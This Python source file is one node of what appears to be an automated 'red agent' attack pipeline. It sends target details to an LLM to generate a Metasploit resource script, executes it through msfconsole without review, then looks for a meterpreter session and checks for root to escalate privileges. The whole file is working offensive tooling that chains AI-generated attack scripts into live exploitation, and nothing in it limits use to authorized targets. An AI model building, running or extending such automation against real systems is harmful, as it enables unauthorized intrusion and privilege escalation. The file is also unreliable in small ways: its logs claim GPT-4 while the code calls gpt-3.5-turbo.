#!/usr/bin/env python3
"""
NODE 6: GPT PWN.RC GENERATION & EXECUTION
Generates pwn.rc using GPT and executes it to get meterpreter + privilege escalation
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os

try:
    from openai import OpenAI
except ImportError:
    OpenAI = None

# Import pwn.rc cleaner
import sys
from pathlib import Path as PathlibPath
sys.path.append(str(PathlibPath(__file__).parent.parent))
from utils.pwn_rc_cleaner import clean_pwn_rc_content, validate_pwn_rc


def node_6_pwn_rc_generation(state: Dict) -> Dict:
    """
    NODE 6: GPT pwn.rc Generation & Execution

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    After Node 5 gets a basic shell with a working exploit + payload, this node:
    1. Sends exploit details to GPT-4
    2. GPT generates a pwn.rc file using a demo template
    3. Saves pwn.rc to session folder
    4. Executes pwn.rc via msfconsole
    5. Gets meterpreter session + privilege escalation in one shot

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS
    ═══════════════════════════════════════════════════════════════════════════

    From Node 5:
    - successful_payloads: List with working payload/exploit
    - primary_session_id: Basic shell session ID
    - target: Target IP address
    - lhost: Attacker IP address
    - session_folder: Path to session directory

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - primary_session_id: New meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True (if privilege escalation successful)
    - privilege_level: "high"

    On Failure:
    - pwn_rc_generated: False
    - error: Error message

    ═══════════════════════════════════════════════════════════════════════════
    """

    logger = logging.getLogger("red_agent.node_6")

    logger.info("═" * 70)
    logger.info("NODE 6: GPT PWN.RC GENERATION & EXECUTION")
    logger.info("═" * 70)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: VALIDATE PREREQUISITES
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Validating Prerequisites")
    logger.info("─" * 70)

    # Get working exploit and payload from Node 5
    successful_payloads = state.get("successful_payloads", [])
    if not successful_payloads:
        logger.error("❌ No successful payloads from Node 5")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "No successful payloads available"
        }

    payload_info = successful_payloads[0]
    exploit_module = payload_info.get("exploit_path", "unknown")  # exploit_path from Node 5
    payload = payload_info.get("payload", "unknown")
    target = state.get("target")
    lhost = state.get("lhost")
    session_folder = state.get("session_folder")

    # Get target OS information for GPT context
    target_os = state.get("detected_os", "Linux (unknown)")
    service_name = state.get("service", "unknown")
    service_version = state.get("service_version", "unknown")

    # If session_folder not set, create one in exploitations directory
    if not session_folder:
        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        exploitations_dir = Path(__file__).parent.parent / "exploitations"
        exploitations_dir.mkdir(exist_ok=True)
        session_folder = exploitations_dir / f"exploit_{target}_{state.get('port', 'unknown')}_gpt_{timestamp}"
        Path(session_folder).mkdir(exist_ok=True)
        logger.info(f"Created session folder: {session_folder}")
        state["session_folder"] = str(session_folder)

    logger.info(f"✓ Exploit: {exploit_module}")
    logger.info(f"✓ Payload: {payload}")
    logger.info(f"✓ Target (RHOST): {target}")
    logger.info(f"✓ Attacker (LHOST): {lhost}")
    logger.info(f"✓ Target OS: {target_os}")
    logger.info(f"✓ Service: {service_name} {service_version}")
    logger.info("")

    # Check OpenAI API key
    openai_api_key = os.getenv("OPENAI_API_KEY")
    if not openai_api_key or openai_api_key == "your_openai_api_key_here":
        logger.error("❌ OPENAI_API_KEY not set in .env file")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OPENAI_API_KEY not configured"
        }

    if not OpenAI:
        logger.error("❌ OpenAI library not installed")
        logger.error("   Install with: pip install openai")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OpenAI library not installed"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: READ DEMO PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Reading Demo pwn.rc Template")
    logger.info("─" * 70)

    demo_pwn_rc = Path(__file__).parent.parent / "pwn.rc"
    if not demo_pwn_rc.exists():
        logger.error(f"❌ Demo pwn.rc not found at {demo_pwn_rc}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Demo pwn.rc not found at {demo_pwn_rc}"
        }

    try:
        demo_content = demo_pwn_rc.read_text()
        logger.info(f"✓ Read demo pwn.rc ({len(demo_content)} bytes)")
    except Exception as e:
        logger.error(f"❌ Failed to read demo pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to read demo pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: SEND TO GPT FOR PWN.RC GENERATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Generating pwn.rc via GPT-4")
    logger.info("─" * 70)

    try:
        client = OpenAI(api_key=openai_api_key)

        prompt = f"""You are a Metasploit resource script generator. Generate plain msfconsole commands, NOT Ruby code.

TARGET INFORMATION:
- Machine: {target_os}
- Service: {service_name} {service_version}
- IP Address: {target}

I have a working shell. Generate a plain Metasploit resource script that upgrades to meterpreter.

EXAMPLE OF CORRECT FORMAT (plain Metasploit commands):
sessions -u 1
sleep 30

sessions

GENERATE PLAIN METASPLOIT COMMANDS:
- Use "sessions -u 1" to upgrade shell to meterpreter
- Use "sleep" to wait
- Use "sessions" to list sessions

CRITICAL - PLAIN TEXT ONLY:
- NO Ruby code, NO helper functions, NO definitions
- Each command on a new line
- Plain Metasploit resource script format
"""

        logger.info("Sending request to GPT-4...")
        logger.info(f"  Exploit: {exploit_module}")
        logger.info(f"  Payload: {payload}")
        logger.info(f"  Target: {target}")

        response = client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[
                {
                    "role": "system",
                    "content": "You are an expert Metasploit framework specialist. You generate only Ruby pwn.rc files. Always use the structure provided in examples. Never add explanations or markdown formatting."
                },
                {"role": "user", "content": prompt}
            ],
            temperature=0.2,
            max_tokens=4000
        )

        generated_pwn_rc = response.choices[0].message.content.strip()
        logger.info(f"✓ GPT-4 generated pwn.rc ({len(generated_pwn_rc)} bytes)")

    except Exception as e:
        logger.error(f"❌ GPT-4 generation failed: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"GPT-4 generation failed: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3.5: CLEAN PWN.RC CONTENT (Remove Markdown Formatting)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3.5: Cleaning pwn.rc content")
    logger.info("─" * 70)

    try:
        generated_pwn_rc = clean_pwn_rc_content(generated_pwn_rc)
        logger.info(f"✓ Cleaned pwn.rc content ({len(generated_pwn_rc)} bytes after cleanup)")

        # Validate the content
        is_valid, error_msg = validate_pwn_rc(generated_pwn_rc)
        if not is_valid:
            logger.warning(f"⚠️  Content validation warning: {error_msg}")
        else:
            logger.info(f"✓ Content validation passed")

    except Exception as e:
        logger.warning(f"⚠️  Content cleaning warning (continuing anyway): {e}")

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Saving Generated pwn.rc")
    logger.info("─" * 70)

    try:
        pwn_rc_path = Path(session_folder) / "generated_pwn.rc"
        pwn_rc_path.write_text(generated_pwn_rc)
        pwn_rc_path.chmod(0o755)  # Make executable
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")
    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Executing pwn.rc via msfconsole")
    logger.info("─" * 70)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("This will exploit the target and escalate privileges...")
    logger.info("")

    try:
        # Run msfconsole with output visible (not captured)
        # This allows the user to see what's happening
        # Uses quiet mode but still shows exploitation progress
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            capture_output=False,  # Show output directly
            timeout=300  # 5 minute timeout
        )

        logger.info("")
        logger.info("✓ pwn.rc execution completed")
        logger.info("Waiting 5 seconds for sessions to be registered...")

        # Wait for sessions to be available in MSF RPC
        time.sleep(5)

    except subprocess.TimeoutExpired:
        logger.warning("⚠️  msfconsole execution timed out")
        logger.info("Continuing to check for sessions...")
        time.sleep(5)
    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: CHECK FOR METERPRETER SESSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 6: Checking for Meterpreter Session")
    logger.info("─" * 70)

    msf_client = state.get("msf_client")
    if not msf_client:
        logger.warning("⚠️  MSF client not available, skipping session check")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "note": "pwn.rc executed, check msfconsole for meterpreter session"
        }

    try:
        time.sleep(5)  # Wait for sessions to be registered
        sessions = msf_client.sessions.list

        meterpreter_sessions = [
            (sid, info) for sid, info in sessions.items()
            if info.get('type') == 'meterpreter'
        ]

        if meterpreter_sessions:
            # Get the latest/highest session ID (most recent)
            meterpreter_sid = max([sid for sid, _ in meterpreter_sessions])
            logger.info(f"✅ Found meterpreter session: {meterpreter_sid}")

            # Check if it's root
            try:
                session = msf_client.sessions.session(meterpreter_sid)
                uid_output = session.run_command("id")
                is_root = "uid=0(root)" in uid_output
                logger.info(f"   User: {'root' if is_root else 'non-root'}")
                logger.info(f"   Output: {uid_output.strip()}")
            except:
                is_root = False

            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "primary_session_id": meterpreter_sid,
                "primary_session_type": "meterpreter",
                "is_root": is_root,
                "privilege_level": "high" if is_root else "low",
                "next_phase": "post_exploitation"
            }
        else:
            logger.warning("⚠️  No meterpreter session found")
            logger.warning("   Returning to graph for fallback routing...")
            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "primary_session_type": None,  # Explicitly set to None so graph routing detects failure
                "note": "pwn.rc executed but no meterpreter session detected - fallback needed"
            }

    except Exception as e:
        logger.warning(f"⚠️  Error checking sessions: {e}")
        logger.warning("   Returning to graph for fallback routing...")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "primary_session_type": None,  # Explicitly set to None so graph routing detects failure
            "note": f"pwn.rc executed, error checking sessions: {str(e)} - fallback needed"
        }
